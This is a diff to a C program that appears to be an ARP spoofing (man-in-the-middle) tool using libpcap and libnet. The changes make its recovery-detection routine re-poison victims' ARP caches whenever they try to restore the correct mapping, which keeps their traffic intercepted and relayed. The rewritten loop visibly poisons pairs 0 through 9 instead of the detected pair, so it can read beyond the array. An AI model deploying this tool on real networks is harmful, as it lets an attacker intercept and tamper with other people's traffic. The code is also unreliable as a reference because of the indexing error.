@@ -194,8 +194,7 @@ int find_target_index(arp_pair* pairs, int count, const char* ip) {
 	return -1;
 }
 
-int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
-		const uint8_t* my_mac, const uint8_t* dst_mac) {
+int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header, const uint8_t* my_mac, const uint8_t* dst_mac) {
 	u_char* new_packet = (u_char*)malloc(header->len);
 	if (new_packet == NULL) {
 		fprintf(stderr, "Memory allocation failed\n");
@@ -218,10 +217,10 @@ int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* head
 	return 0;
 }
 
-int detect_recovery(const u_char* packet, arp_pair* pairs, int cnt) {
+void detect_recovery(pcap_t* pcap, const uint8_t* my_mac, const u_char* packet, arp_pair* pairs, int cnt) {
 	struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
 	if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) {
-		return -1;
+		return;
 	}
 
 	struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
@@ -240,26 +239,28 @@ int detect_recovery(const u_char* packet, arp_pair* pairs, int cnt) {
 
 	addr.s_addr = *(uint32_t*)dst_ip;
 	inet_ntop(AF_INET, &addr, dst_ip_str, sizeof(dst_ip_str));
-	
+
 	for (int i = 0; i < cnt; i++) {
-		if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST && 
-				strcmp(src_ip_str, pairs[i].sender_ip) == 0 && 
-				memcmp(dst_hw, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
+		if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST && strcmp(src_ip_str, pairs[i].sender_ip) == 0) {
 
-			printf("Recovery detected (SCENARIO 1): Sender %s is broadcasting ARP request for target %s\n", 
-					src_ip_str, dst_ip_str);
-			return i;
+			printf("Recovery detected (SCENARIO 1): Sender %s is broadcasting ARP request for target %s\n", src_ip_str, dst_ip_str);
+			printf("Re-infecting pair %d after recovery detection\n", i);
+			for (int j = 0; j < 10; j++) {
+				send_poison(pcap, my_mac, pairs[j].sender_mac, pairs[j].sender_ip, pairs[j].target_ip);
+				sleep(1);
+			}
 		}
-		if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST &&
-                                strcmp(src_ip_str, pairs[i].target_ip) == 0 &&
-                                memcmp(dst_hw, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
+		else if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST && strcmp(src_ip_str, pairs[i].target_ip) == 0) {
 
-                        printf("Recovery detected (SCENARIO 2): Target %s is broadcasting ARP request for sender %s\n",
-                                        src_ip_str, dst_ip_str);
-                        return i;
-                }
+			printf("Recovery detected (SCENARIO 2): Target %s is broadcasting ARP request for sender %s\n",src_ip_str, dst_ip_str);
+			printf("Re-infecting pair %d after recovery detection\n", i);
+			for (int j = 0; j < 10; j++) {
+				send_poison(pcap, my_mac, pairs[j].sender_mac, pairs[j].sender_ip, pairs[j].target_ip);
+				sleep(1);
+			}
+		}
 	}
-	return -1;
+	return;
 }
 
 int main(int argc, char* argv[]) {
@@ -353,16 +354,7 @@ int main(int argc, char* argv[]) {
 			continue;
 		}
 
-		int recovered_pair = detect_recovery(packet, pairs, cnt);
-		if (recovered_pair >= 0) {
-			printf("Re-infecting pair %d after recovery detection\n", recovered_pair);
-			for (int i = 0; i < 10; i++) {
-				send_poison(pcap, my_mac, pairs[recovered_pair].sender_mac, 
-						pairs[recovered_pair].sender_ip, 
-						pairs[recovered_pair].target_ip);
-				sleep(1);
-			}
-		}
+		detect_recovery(pcap, my_mac, packet, pairs, cnt);
 
 		int is_for_me = is_my_mac(eth_hdr->ether_dhost, my_mac);
 
